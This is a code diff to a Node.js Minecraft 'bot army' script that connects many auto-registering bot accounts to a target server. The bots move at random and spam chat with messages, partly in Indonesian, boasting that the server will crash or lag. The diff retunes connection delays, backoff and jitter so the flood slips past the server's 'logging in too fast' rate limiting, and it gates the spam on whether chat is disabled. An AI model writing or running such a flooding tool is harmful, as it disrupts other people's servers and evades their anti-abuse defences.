@@ -17,10 +17,20 @@ let credentials = fs.existsSync(credPath) ? fs.readJsonSync(credPath) : {};
 const activeBots = new Map();
 
 // Global rate limiting
-let currentDelay = 1500; // Start with 1.5s between connections
+let currentDelay = 30000; // Start with 30s between connections
 let lastConnectionTime = 0;
 let rateLimitDetected = false;
-const MAX_DELAY = 30000; // Maximum 30s delay
+const MAX_DELAY = 120000; // Maximum 2 minutes delay
+let chatDisabled = true; // Assume chat is disabled by default
+
+// Server-specific settings
+const serverSettings = {
+  maxConcurrentBots: 20, // Maximum number of bots to have active at once
+  chatDisabled: true,    // Flag to track if chat is disabled
+  authTimeoutDetected: false, // Flag to track auth timeout issues
+  requiresAuth: true,    // Flag to indicate server requires authentication
+  botCount: 0,           // Current number of active bots
+};
 
 // ANSI color codes for console output
 const colors = {
@@ -29,7 +39,8 @@ const colors = {
   green: '\x1b[32m',
   yellow: '\x1b[33m',
   blue: '\x1b[34m',
-  cyan: '\x1b[36m'
+  cyan: '\x1b[36m',
+  magenta: '\x1b[35m'
 };
 
 // Logger function with colors and file output
@@ -46,6 +57,7 @@ function log(botName, message, type = 'info') {
     else if (type === 'success') color = colors.green;
     else if (type === 'warning') color = colors.yellow;
     else if (type === 'system') color = colors.cyan;
+    else if (type === 'chat') color = colors.magenta;
     
     // Console output
     console.log(`${color}${logMessage}${colors.reset}`);
@@ -70,7 +82,7 @@ async function createBotWithRateLimit(index) {
   // If we need to wait more, do so
   if (timeSinceLastConnection < currentDelay) {
     const waitTime = currentDelay - timeSinceLastConnection;
-    log('SYSTEM', `Rate limiting: waiting ${waitTime}ms before next connection`, 'warning');
+    log('SYSTEM', `Rate limiting: waiting ${Math.round(waitTime/1000)}s before next connection`, 'warning');
     await delay(waitTime);
   }
   
@@ -83,10 +95,10 @@ async function createBotWithRateLimit(index) {
 async function createBot(index) {
   const username = `${config.prefix}${index}`;
   let reconnectAttempts = 0;
-  const maxReconnectAttempts = 10; // Increased from 5
-  let reconnectDelay = 5000; // Start with 5 seconds
+  const maxReconnectAttempts = 5; // Reduced from 10
+  let reconnectDelay = 30000; // Start with 30 seconds
   let loginRetries = 0;
-  const maxLoginRetries = 3;
+  const maxLoginRetries = 2; // Reduced from 3
   
   async function connect() {
     try {
@@ -110,9 +122,9 @@ async function createBot(index) {
         username,
         version: config.version,
         keepAlive: true,
-        checkTimeoutInterval: 30000,
+        checkTimeoutInterval: 60000, // Increased timeout check
         viewDistance: 'tiny', // Reduce network load
-        connectTimeout: 30000, // Increase connect timeout
+        connectTimeout: 60000, // Increase connect timeout
         respawn: true, // Auto respawn if killed
         skipValidation: true, // Skip validation
       });
@@ -139,7 +151,7 @@ async function createBot(index) {
         rateLimitDetected = true;
         // Increase global delay when we see connection resets
         currentDelay = Math.min(currentDelay * 1.5, MAX_DELAY);
-        log('SYSTEM', `ECONNRESET detected, increasing global delay to ${currentDelay}ms`, 'warning');
+        log('SYSTEM', `ECONNRESET detected, increasing global delay to ${Math.round(currentDelay/1000)}s`, 'warning');
       }
     });
     
@@ -149,7 +161,7 @@ async function createBot(index) {
       
       try {
         // Wait a bit before trying to authenticate
-        await delay(1000 + Math.random() * 500);
+        await delay(2000 + Math.random() * 1000);
         
         // Handle authentication
         if (!credentials[username]) {
@@ -163,26 +175,32 @@ async function createBot(index) {
         
         // Reset reconnection attempts on successful spawn
         reconnectAttempts = 0;
-        reconnectDelay = 5000;
+        reconnectDelay = 30000;
         loginRetries = 0;
       } catch (error) {
         log(username, `Error during spawn: ${error.message}`, 'error');
       }
     });
     
-    // Message handler for login detection
+    // Message handler for login detection and chat disabled detection
     bot.on('message', (message) => {
       const msg = message.toString().toLowerCase();
       
       // Log all messages
       log(username, `Chat: ${message.toString()}`, 'info');
       
+      // Check for chat disabled message
+      if (msg.includes("chat is disabled")) {
+        chatDisabled = true;
+        log(username, 'Chat is disabled on this server', 'warning');
+      }
+      
       // Check for rate limiting messages
       if (msg.includes("logging in too fast") || msg.includes("try again later")) {
         rateLimitDetected = true;
         // Increase global delay when rate limited
         currentDelay = Math.min(currentDelay * 2, MAX_DELAY);
-        log('SYSTEM', `Rate limit detected, increasing global delay to ${currentDelay}ms`, 'warning');
+        log('SYSTEM', `Rate limit detected, increasing global delay to ${Math.round(currentDelay/1000)}s`, 'warning');
       }
       
       // Handle login success/failure messages
@@ -200,7 +218,7 @@ async function createBot(index) {
               bot.chat(`/login ${credentials[username]}`);
               log(username, `Retrying login... (${loginRetries + 1}/${maxLoginRetries})`, 'warning');
             }
-          }, 3000);
+          }, 5000);
         } else {
           log(username, `Max login retries (${maxLoginRetries}) reached`, 'error');
         }
@@ -234,7 +252,7 @@ async function createBot(index) {
       
       // If we're rate limited, add extra delay
       if (rateLimitDetected) {
-        const extraDelay = Math.random() * 10000 + 5000; // 5-15s additional delay
+        const extraDelay = Math.random() * 30000 + 30000; // 30-60s additional delay
         log(username, `Rate limit detected, adding ${Math.round(extraDelay/1000)}s extra delay`, 'warning');
         await delay(extraDelay);
         rateLimitDetected = false;
@@ -244,7 +262,7 @@ async function createBot(index) {
       if (reconnectAttempts < maxReconnectAttempts) {
         reconnectAttempts++;
         // Add jitter to the reconnect delay to prevent all bots reconnecting at once
-        const jitter = Math.random() * 2000 - 1000; // ±1s jitter
+        const jitter = Math.random() * 10000 - 5000; // ±5s jitter
         const actualDelay = reconnectDelay + jitter;
         
         log(username, `Reconnecting in ${Math.round(actualDelay/1000)}s (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
@@ -253,7 +271,7 @@ async function createBot(index) {
           // Use rate-limited connect to prevent server overload
           await createBotWithRateLimit(index);
           // Increase delay for next attempt with a slower growth rate
-          reconnectDelay = Math.min(reconnectDelay * 1.3, 30000);
+          reconnectDelay = Math.min(reconnectDelay * 1.5, 120000);
         }, actualDelay);
       } else {
         log(username, 'Max reconnection attempts reached', 'error');
@@ -274,7 +292,12 @@ async function createBot(index) {
           rateLimitDetected = true;
           // Double the connection delay when explicitly rate limited
           currentDelay = Math.min(currentDelay * 2, MAX_DELAY);
-          log('SYSTEM', `Rate limit kick detected, doubling global delay to ${currentDelay}ms`, 'warning');
+          log('SYSTEM', `Rate limit kick detected, doubling global delay to ${Math.round(currentDelay/1000)}s`, 'warning');
+        }
+        
+        // Check for auth timeout
+        if (typeof reasonStr === 'string' && reasonStr.includes("authorisation time")) {
+          log('SYSTEM', 'Auth timeout detected, will adjust login timing', 'warning');
         }
       } catch (e) {
         log(username, `Kicked: ${reason}`, 'error');
@@ -288,45 +311,34 @@ async function createBot(index) {
       }
     });
     
-    // Player tracking
+    // Player tracking (reduced to minimize log spam)
     bot.on('playerJoined', (player) => {
-      log(username, `Player joined: ${player.username}`);
+      // Only log non-bot players to reduce spam
+      if (!player.username.startsWith(config.prefix)) {
+        log(username, `Player joined: ${player.username}`, 'info');
+      }
     });
     
     bot.on('playerLeft', (player) => {
-      log(username, `Player left: ${player.username}`);
-    });
-    
-    // Movement error handler (to prevent crashes)
-    bot.on('moveEntityError', (entity) => {
-      log(username, `Move entity error with ${entity.name || entity.username || 'entity'}`, 'error');
+      // Only log non-bot players to reduce spam
+      if (!player.username.startsWith(config.prefix)) {
+        log(username, `Player left: ${player.username}`, 'info');
+      }
     });
   }
   
-  // Start the bot behaviors - using more conservative timings
+  // Start the bot behaviors - using more conservative timings and respecting chat disabled
   function startBotActivities(bot, username) {
-    // Custom messages for spam
-    const messages = [
-      `${username} siap menghancurkan server! 🔥`,
-      `Server ini akan down oleh ${username}! 💣`,
-      `${username} tidak terkalahkan! ⚔️`,
-      `Bot army telah datang! 🤖`,
-      `Resistance is futile! ${username} is here! 🛡️`,
-      `${username} akan membuat server lag! 📉`,
-      `Jangan coba melawan ${username}! 👑`,
-      `${username} telah bangkit! 🧟`
-    ];
-    
     // More complex movements
     const moveIntervals = [];
     
-    // Jump around (less frequently)
+    // Jump around (much less frequently)
     moveIntervals.push(setInterval(() => {
       if (bot.entity) {
         bot.setControlState('jump', true);
         setTimeout(() => bot.setControlState('jump', false), 350);
       }
-    }, 8000 + Math.random() * 5000));
+    }, 15000 + Math.random() * 10000));
     
     // Random movement (less frequently)
     moveIntervals.push(setInterval(() => {
@@ -342,15 +354,28 @@ async function createBot(index) {
         // Random look
         bot.look(Math.random() * Math.PI * 2, Math.random() * Math.PI - Math.PI/2);
       }
-    }, 5000 + Math.random() * 5000));
+    }, 10000 + Math.random() * 5000));
     
-    // Chat spam with random messages (much less frequently)
-    moveIntervals.push(setInterval(() => {
-      if (bot.entity) {
-        const message = messages[Math.floor(Math.random() * messages.length)];
-        bot.chat(message);
-      }
-    }, 15000 + Math.random() * 10000));
+    // Chat spam only if chat is not disabled
+    if (!chatDisabled) {
+      moveIntervals.push(setInterval(() => {
+        if (bot.entity) {
+          // Custom messages for spam
+          const messages = [
+            `${username} siap menghancurkan server! 🔥`,
+            `Server ini akan down oleh ${username}! 💣`,
+            `${username} tidak terkalahkan! ⚔️`,
+            `Bot army telah datang! 🤖`,
+            `Resistance is futile! ${username} is here! 🛡️`,
+            `${username} akan membuat server lag! 📉`,
+            `Jangan coba melawan ${username}! 👑`,
+            `${username} telah bangkit! 🧟`
+          ];
+          const message = messages[Math.floor(Math.random() * messages.length)];
+          bot.chat(message);
+        }
+      }, 30000 + Math.random() * 30000)); // Very infrequent chat
+    }
     
     // Clean up intervals on disconnect
     bot.once('end', () => {
@@ -368,15 +393,17 @@ async function createBot(index) {
     // Show startup message
     log('SYSTEM', `Starting bot army for ${config.host}:${config.port}`, 'system');
     log('SYSTEM', `Targeting Minecraft ${config.version} with ${config.totalBots} bots`, 'system');
-    log('SYSTEM', `Initial connection delay: ${currentDelay}ms`, 'system');
+    log('SYSTEM', `Initial connection delay: ${Math.round(currentDelay/1000)}s`, 'system');
     
     // Launch bots with rate limiting
     for (let i = config.startIndex; i < config.startIndex + config.totalBots; i++) {
       await createBotWithRateLimit(i);
+      
       // Add dynamic delay based on observations
       if (rateLimitDetected) {
         log('SYSTEM', 'Rate limit detected, increasing connection delay', 'warning');
         rateLimitDetected = false;
+        await delay(60000); // Wait a full minute after rate limit detection
       }
     }
     
@@ -385,7 +412,7 @@ async function createBot(index) {
       const uptime = process.uptime();
       const minutes = Math.floor(uptime / 60);
       const seconds = Math.floor(uptime % 60);
-      log('SYSTEM', `Status: ${activeBots.size}/${config.totalBots} bots active, uptime: ${minutes}m ${seconds}s, current delay: ${currentDelay}ms`, 'system');
+      log('SYSTEM', `Status: ${activeBots.size}/${config.totalBots} bots active, uptime: ${minutes}m ${seconds}s, current delay: ${Math.round(currentDelay/1000)}s`, 'system');
     }, 60000);
   } catch (err) {
     log('SYSTEM', `CRITICAL ERROR: ${err.message}`, 'error');
